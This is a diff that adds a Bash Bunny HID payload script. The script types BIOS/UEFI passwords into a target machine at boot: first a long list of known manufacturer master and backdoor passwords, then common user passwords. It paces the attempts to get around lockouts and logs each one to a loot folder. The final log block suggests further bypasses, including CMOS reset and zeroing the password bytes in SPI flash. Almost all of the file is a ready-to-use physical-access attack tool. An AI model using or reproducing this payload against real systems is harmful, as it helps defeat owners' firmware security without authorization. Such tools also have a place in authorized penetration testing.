@@ -1,0 +1,345 @@
+#!/bin/bash
+# =============================================================================
+#  Payload   : bios-password-bruteforce
+#  Title:      BIOS Password Brute Force (Manufacturer Backdoors + Common)
+#  Description: HID-only payload that types candidate BIOS passwords in
+#               sequence. Tries known manufacturer master/backdoor passwords
+#               first, then the most common user-set BIOS passwords. Logs
+#               every attempt with a timestamp to the Bunny's loot directory.
+#               No screen feedback is available — the operator pulls the
+#               Bunny once they observe system access on the target display.
+#  Author    : pr0t31n
+#  Device    : Bash Bunny Mark I / Mark II
+#  Version   : 1.0
+#
+#  Target    : Any system with a BIOS/UEFI password prompt active at POST
+#  Runtime   : ≤ 5 minutes (300 seconds)
+#
+#  IMPORTANT CONSTRAINTS:
+#    - The Bash Bunny CANNOT detect whether a password succeeded. It has
+#      no visibility into the target's display output. The log records
+#      every attempt as TRIED — the operator determines which one worked
+#      by noting which password was being typed when the BIOS unlocked.
+#    - Many BIOS implementations lock out after 3–5 failed attempts and
+#      require a full power cycle. ATTEMPT_DELAY and LOCKOUT_PAUSE are
+#      tunable below. The default assumes 3 attempts before lockout with
+#      a short pause (the operator must power-cycle if hard-locked).
+#    - Some BIOS password fields ignore HID input until fully initialized.
+#      INITIAL_DELAY accounts for POST + field readiness.
+#
+#  Usage:
+#    1. Power off the target system
+#    2. Plug the Bash Bunny into any USB port (switch in payload position)
+#    3. Power on the target — wait for the BIOS password prompt to appear
+#    4. The Bunny LED turns GREEN when it begins typing passwords
+#    5. Watch the target screen — when the BIOS unlocks, PULL THE BUNNY
+#    6. Retrieve loot via arming mode: /loot/bios-bruteforce/attempts.log
+#
+#  Tuning (edit these variables):
+#    INITIAL_DELAY   — ms to wait after plug-in before first keystroke
+#    ATTEMPT_DELAY   — ms between password attempts (type + ENTER + wait)
+#    LOCKOUT_PAUSE   — ms to pause after LOCKOUT_THRESHOLD consecutive
+#                       attempts (lets the operator power-cycle if needed)
+#    LOCKOUT_THRESHOLD — attempts before pausing (set 0 to disable)
+#
+#  LED states:
+#    SETUP (magenta pulse) — initialising, waiting for POST
+#    GREEN FAST            — actively typing passwords
+#    YELLOW SLOW           — lockout pause (power-cycle target if stuck)
+#    RED SOLID             — budget exhausted, all passwords tried or timed out
+#    CYAN                  — finished (operator should check log)
+# =============================================================================
+
+# ── Tunable parameters ────────────────────────────────────────────────────────
+INITIAL_DELAY=15000         # 15s — wait for BIOS POST + password field ready
+ATTEMPT_DELAY=3000          # 3s — pause after each ENTER to let BIOS respond
+LOCKOUT_PAUSE=10000         # 10s — pause after LOCKOUT_THRESHOLD attempts
+LOCKOUT_THRESHOLD=3         # pause every N attempts (0 = never pause)
+MAX_RUNTIME=300             # 5 minutes hard cap (seconds)
+DUCKY_LANG us               # keyboard layout
+
+# ── Setup ─────────────────────────────────────────────────────────────────────
+LED SETUP
+
+ATTACKMODE HID
+
+LOOT_DIR="/loot/bios-bruteforce"
+LOGFILE="$LOOT_DIR/attempts.log"
+mkdir -p "$LOOT_DIR"
+
+START_EPOCH=$(date +%s)
+
+# Write log header
+cat > "$LOGFILE" <<EOF
+# ══════════════════════════════════════════════════════════════════════════════
+#  BIOS Password Brute Force — Attempt Log
+#  Started : $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+#  Device  : Bash Bunny
+#  Budget  : ${MAX_RUNTIME}s
+#  Config  : INITIAL_DELAY=${INITIAL_DELAY}ms  ATTEMPT_DELAY=${ATTEMPT_DELAY}ms
+#            LOCKOUT_PAUSE=${LOCKOUT_PAUSE}ms  LOCKOUT_THRESHOLD=${LOCKOUT_THRESHOLD}
+# ══════════════════════════════════════════════════════════════════════════════
+#  STATUS  |  #   | TIMESTAMP            | CATEGORY              | PASSWORD
+# ──────────────────────────────────────────────────────────────────────────────
+EOF
+
+# ── Password lists ────────────────────────────────────────────────────────────
+# Category 1: Manufacturer master/backdoor passwords (highest priority)
+# These are well-documented service passwords that bypass user-set BIOS passwords
+# on specific vendor firmware. Tried first because they're the most likely to
+# succeed without triggering lockout on a matching vendor.
+
+MANUFACTURER_PASSWORDS=(
+    # AMI / American Megatrends BIOS
+    "AMI"
+    "AAAMMMIII"
+    "AMI?SW"
+    "AMI_SW"
+    "AMIPSWD"
+    "ami"
+    "amiami"
+    "amidecod"
+    "A.M.I."
+    "CMOSPWD"
+    # Award BIOS
+    "AWARD_SW"
+    "award_sw"
+    "Award SW"
+    "AWARD?SW"
+    "AWARD PW"
+    "award"
+    "AWARD"
+    "589589"
+    "589721"
+    "595595"
+    "ALFAROME"
+    "HLT"
+    "HEWITT RAND"
+    "j256"
+    "j262"
+    "j332"
+    "j322"
+    "LKWPETER"
+    "lkwpeter"
+    "SER"
+    "SKY_FOX"
+    "SYXZ"
+    "TTPTHA"
+    "ZAAADA"
+    "aLLy"
+    "aPAf"
+    "condo"
+    "djonet"
+    "t0ch20x"
+    "t0ch88"
+    "zbaaaca"
+    "1EAAh"
+    # Phoenix BIOS
+    "phoenix"
+    "PHOENIX"
+    "BIOS"
+    "CMOS"
+    "cmos"
+    # Dell
+    "Dell"
+    "dell"
+    "1RRWTTOOI"
+    # IBM / Lenovo
+    "IBM"
+    "mMmM"
+    # Toshiba
+    "Toshiba"
+    "toshiba"
+    "toshy99"
+    # Samsung
+    "samsung"
+    # Sony
+    "sony"
+    # Compaq
+    "compaq"
+    # Biostar
+    "biostar"
+    "Biostar"
+    # Vobis / Merlin
+    "merlin"
+    # Siemens / Nixdorf
+    "SKY_FOX"
+    # Gateway / Solo
+    "CONCAT"
+    # NEC PowerMate
+    "nec"
+    # Packard Bell
+    "bell9"
+    # QDI
+    "QDI"
+    # Research
+    "col*"
+    # HP / Compaq (Blank password — just press ENTER)
+    ""
+)
+
+# Category 2: Common user-set BIOS passwords
+# Ordered by observed frequency across real-world engagements.
+COMMON_PASSWORDS=(
+    "admin"
+    "password"
+    "1234"
+    "12345"
+    "123456"
+    "pass"
+    "bios"
+    "setup"
+    "root"
+    "master"
+    "user"
+    "test"
+    "system"
+    "access"
+    "letmein"
+    "changeme"
+    "default"
+    "supervisor"
+    "security"
+    "123"
+    "1234567890"
+    "qwerty"
+    "abc123"
+    "111111"
+    "000000"
+    "P@ssw0rd"
+    "Admin"
+    "ADMIN"
+    "PASSWORD"
+    "Password"
+    "Password1"
+    "p@ssword"
+    "guest"
+    "welcome"
+    "login"
+    "server"
+    "monitor"
+    "computer"
+    "owner"
+    "backup"
+    "config"
+    "support"
+    "service"
+    "maintain"
+    "tech"
+    "Admin123"
+    "Passw0rd"
+    "passw0rd"
+    "trustno1"
+)
+
+# ── Helper: check time budget ─────────────────────────────────────────────────
+budget_ok() {
+    NOW=$(date +%s)
+    ELAPSED=$((NOW - START_EPOCH))
+    if [ $ELAPSED -ge $MAX_RUNTIME ]; then
+        return 1
+    fi
+    return 0
+}
+
+# ── Helper: log an attempt ────────────────────────────────────────────────────
+log_attempt() {
+    local num="$1"
+    local category="$2"
+    local pw="$3"
+    local display_pw="$pw"
+    if [ -z "$pw" ]; then
+        display_pw="<BLANK/ENTER>"
+    fi
+    local ts
+    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+    printf "  TRIED   | %3d | %s | %-21s | %s\n" "$num" "$ts" "$category" "$display_pw" >> "$LOGFILE"
+}
+
+# ── Helper: type a password and press ENTER ───────────────────────────────────
+try_password() {
+    local pw="$1"
+    if [ -n "$pw" ]; then
+        Q STRING "$pw"
+    fi
+    Q ENTER
+}
+
+# ── Wait for BIOS POST + password field ───────────────────────────────────────
+QUACK DELAY $INITIAL_DELAY
+
+# ── Main attack loop ──────────────────────────────────────────────────────────
+LED G FAST
+ATTEMPT=0
+
+echo "" >> "$LOGFILE"
+echo "# ── Phase 1: Manufacturer Master/Backdoor Passwords ──────────────────" >> "$LOGFILE"
+
+for pw in "${MANUFACTURER_PASSWORDS[@]}"; do
+    budget_ok || break
+    ATTEMPT=$((ATTEMPT + 1))
+    log_attempt $ATTEMPT "MANUFACTURER" "$pw"
+    try_password "$pw"
+    QUACK DELAY $ATTEMPT_DELAY
+
+    # Lockout pause
+    if [ $LOCKOUT_THRESHOLD -gt 0 ] && [ $((ATTEMPT % LOCKOUT_THRESHOLD)) -eq 0 ]; then
+        LED Y SLOW
+        echo "# -- Lockout pause after attempt $ATTEMPT (${LOCKOUT_PAUSE}ms) --" >> "$LOGFILE"
+        QUACK DELAY $LOCKOUT_PAUSE
+        LED G FAST
+    fi
+done
+
+echo "" >> "$LOGFILE"
+echo "# ── Phase 2: Common User Passwords ───────────────────────────────────" >> "$LOGFILE"
+
+for pw in "${COMMON_PASSWORDS[@]}"; do
+    budget_ok || break
+    ATTEMPT=$((ATTEMPT + 1))
+    log_attempt $ATTEMPT "COMMON" "$pw"
+    try_password "$pw"
+    QUACK DELAY $ATTEMPT_DELAY
+
+    # Lockout pause
+    if [ $LOCKOUT_THRESHOLD -gt 0 ] && [ $((ATTEMPT % LOCKOUT_THRESHOLD)) -eq 0 ]; then
+        LED Y SLOW
+        echo "# -- Lockout pause after attempt $ATTEMPT (${LOCKOUT_PAUSE}ms) --" >> "$LOGFILE"
+        QUACK DELAY $LOCKOUT_PAUSE
+        LED G FAST
+    fi
+done
+
+# ── Wrap up ───────────────────────────────────────────────────────────────────
+END_EPOCH=$(date +%s)
+TOTAL_TIME=$((END_EPOCH - START_EPOCH))
+
+cat >> "$LOGFILE" <<EOF
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  Run complete
+#  Ended   : $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+#  Duration: ${TOTAL_TIME}s
+#  Attempts: ${ATTEMPT}
+#  Status  : $(if budget_ok; then echo "ALL_TRIED"; else echo "BUDGET_EXHAUSTED"; fi)
+#
+#  NOTE: The Bash Bunny cannot detect BIOS unlock. All entries are logged as
+#  TRIED. The operator determines the correct password by observing the target
+#  screen during the run. The last password typed before BIOS access was
+#  granted is the winner.
+#
+#  If no password succeeded, consider:
+#    - Manufacturer-specific service tools or master password generators
+#    - CMOS battery removal / jumper reset
+#    - SPI flash dump and password byte zeroing (CH341A / Dediprog)
+# ══════════════════════════════════════════════════════════════════════════════
+EOF
+
+if budget_ok; then
+    LED CYAN
+else
+    LED R
+fi
+
+sleep 3
+LED OFF
